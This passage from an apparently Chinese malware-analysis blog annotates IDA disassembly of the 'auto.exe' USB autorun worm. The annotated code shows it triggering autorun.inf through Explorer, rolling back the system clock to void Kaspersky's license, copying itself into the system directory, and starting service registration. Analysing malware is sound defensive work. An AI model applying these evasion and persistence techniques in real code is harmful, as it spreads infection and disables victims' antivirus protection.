
```asm
004027AB             push    1               ; dwMilliseconds  

004027AD             call    edi ; Sleep  

004027AF             lea     eax, [ebp+var_11C]  

004027B5             push    eax  

004027B6             push    offset aDd33gsd2_dll ; "dd33gsd2.dll"  

004027BB             call    strcpy  

004027C0             push    offset a_dll    ; ".DLL"  

004027C5             push    offset aDd33gsd2_dll ; "dd33gsd2.dll"  

004027CA             call    strcat          ; 以 VolumeSerialNumber 命名 Dll  

004027CF             add     esp, 10h  

004027D2             lea     eax, [ebp+var_11C]  

004027D8             push    eax  

004027D9             push    offset dword_410E1C  

004027DE             call    ds:lstrcpy  
```

## 第二宗罪 主动开启浏览器，放行 `autorun.inf`

`autorun.inf` 并不是本文主角的专利，早在春秋战国时期就已经成为各路病毒愚弄菜菜的常备武器。然而在大家都是静候菜菜插入优盘，打开浏览器之时，`auto.exe` 却再次主动出击，迫不及待地打开浏览器，为 `autorun.inf` 开路。

```asm
0040281C             lea     eax, [ebp+lpVirusPathName]  

00402822             push    104h            ; nSize  

00402827             push    eax             ; lpFilename  

00402828             push    0               ; hModule  

0040282A             call    ds:GetModuleFileNameA ; 取得病毒当前路径  

00402830             test    eax, eax  

00402832             jnz     short loc_40283C  

00402834             push    1  

00402836             pop     eax  

00402837             jmp     loc_402C04  

0040283C ; ----------------------------------------------------------------------------  

0040283C loc_40283C:                           ; CODE XREF: WinMain(x,x,x,x)+6C3j  

0040283C             lea     eax, [ebp+var_VirusName]  

00402842             push    eax  

00402843             lea     eax, [ebp+lpVirusPathName]  

00402849             push    eax  

0040284A             call    strstr          ; 检索病毒文件字符串 auto.exe  

0040284F             pop     ecx  

00402850             test    eax, eax  

00402852             pop     ecx  

00402853             jz      short loc_4028A7 ; emmm...  

00402853                             ; 老毒物没有在当前根目录下找到 auto.exe  

00402853                             ; 说明已经感染到系统目录下了  

00402855             lea     eax, [ebp+lpVirusPathName]  

0040285B             push    eax  

0040285C             call    strlen  

00402861             cmp     eax, 2  

00402864             pop     ecx  

00402865             jbe     short loc_4028A7  

00402867             movsx   eax, [ebp+lpVirusPathName]  

0040286E             push    eax  

0040286F             lea     eax, [ebp+lpVirusPathName]  

00402875             push    offset aC       ; "%c:\\"  

0040287A             push    eax  

0040287B             mov     [ebp+var_SysInfectFlag], 1  

00402882             call    sprintf         ; 生成所在根目录字符串，如 C:\  

00402887             add     esp, 0Ch  

0040288A             lea     eax, [ebp+lpVirusPathName]  

00402890             push    1               ; nShowCmd  

00402892             push    0               ; lpDirectory  

00402894             push    eax             ; lpParameters  

00402895             push    offset aExplorer_exe ; lpFile  

0040289A             push    offset aOpen    ; lpOperation  

0040289F             push    0               ; hwnd  

004028A1             call    ds:ShellExecuteA ; 用 Explorer.exe 打开该根目录  

004028A1                             ; 由于 inf 文件的存在此时会自动  

004028A1                             ; 执行 auto.exe  
```

## 第三宗罪 时光倒流

这一招可是再次刺痛了卡巴的要害。。。(卡巴：`auto` 啊 `auto`，我俩本无瓜葛，你为何就如此针对我捏? >.<)

```asm
004028A7 loc_4028A7:  

004028A7             call    FoolKaspersky  

{  
  00401000 FoolKaspersky   proc near  
  00401000  
  00401000 SystemTime      = SYSTEMTIME ptr -10h  
  00401000  
  00401000             push    ebp  
  00401001             mov     ebp, esp  
  00401003             sub     esp, 10h  
  00401006             push    esi  
  …………………………  
  …………………………  
  00401298             push    offset aAvp_exe ; "avp.exe"  
  0040129D             call    CountAVP        ; 查找 AVP 相关的进程数  
  004012A2             add     esp, 2Ch  
  004012A5             test    eax, eax  
  004012A7             pop     edi  
  004012A8             pop     esi  
  004012A9             jg      short loc_4012B0 ; 当进程数不为 0 时  
  004012A9                             ; 修改系统时间使 AVP License 失效  
  004012AB             or      eax, 0FFFFFFFFh  
  004012AE             leave  
  004012AF             retn  
  004012B0 ; ----------------------------------------------------------------------------  
  004012B0  
  004012B0 loc_4012B0:  
  004012B0             lea     eax, [ebp+SystemTime] ; 当进程数不为 0 时  
  004012B0                             ; 修改系统时间使 AVP License 失效  
  004012B3             push    eax             ; lpSystemTime  
  004012B4             call    ds:GetSystemTime  
  004012BA             cmp     [ebp+SystemTime.wYear], 7D5h  
  004012C0             jbe     short loc_4012D2  
  004012C2             lea     eax, [ebp+SystemTime]  
  004012C5             mov     [ebp+SystemTime.wYear], 7D5h  
  004012CB             push    eax             ; lpSystemTime  
  004012CC             call    ds:SetSystemTime  
  004012D2  
  004012D2 loc_4012D2:  
  004012D2             push    4E20h           ; dwMilliseconds  
  004012D7             call    ds:Sleep  
  004012DD             push    1  
  004012DF             pop     eax  
  004012E0             leave  
  004012E1             retn  
  004012E1 FoolKaspersky   endp  
}  

004028AC             cmp     [ebp+dwSysOpVer], VER_PLATFORM_WIN32_NT  

004028B0             jnz     loc_402BEF        ; 如果是 Win9x，下面的部分就可以幸免了  

004028B6             push    0FFh  

004028BB             lea     eax, [ebp+var_41C]  

004028C1             push    0  

004028C3             push    eax  

004028C4             call    memset          ; 填零初始化  
```

## 第四宗罪 伪装系统服务派发员

`auto.exe` 不是街头混混，出手如此大气，足见其志在高远。只可惜笔者这块内容生疏，回头恶补 `MSDN` 再奉上。。。

```asm
004028BB             lea     eax, [ebp+var_41C]  

004028C1             push    0  

004028C3             push    eax  

004028C4             call    memset          ; 填零初始化  

004028C9             add     esp, 0Ch  

004028CC             lea     eax, [ebp+var_41C]  

004028D2             push    offset aDd33gsd2_exe_0 ; "dd33gsd2.exe"  

004028D7             push    eax  

004028D8             call    ds:lstrcpy      ; 复制刚才根据 VolumeSerialNumber  

004028D8                             ; 生成的[VolumeSerialNumber].exe 名称  

004028DE             lea     eax, [ebp+var_41C]  

004028E4             push    1  

004028E6             push    eax  

004028E7             call    CopySelfToSysDir_As_VSNexe ;  

004028E7                             ; 把自身以[VolumeSerialNumber].exe  

004028E7                             ; 为名复制到系统目录  

004028EC             push    offset aK       ; "-k"  

004028F1             push    [ebp+arg_szCmdLine]  

004028F4             call    strstr          ; 是否存在命令行参数 -k?  

004028F9             add     esp, 10h  

004028FC             test    eax, eax  

004028FE             jz      loc_402BB1  

00402904             xor     edi, edi        ; 没有，接下去把系统目录下的  

00402904                             ; 病毒体注册为服务  

00402906             push    esi  

00402907             push    ebx  
```
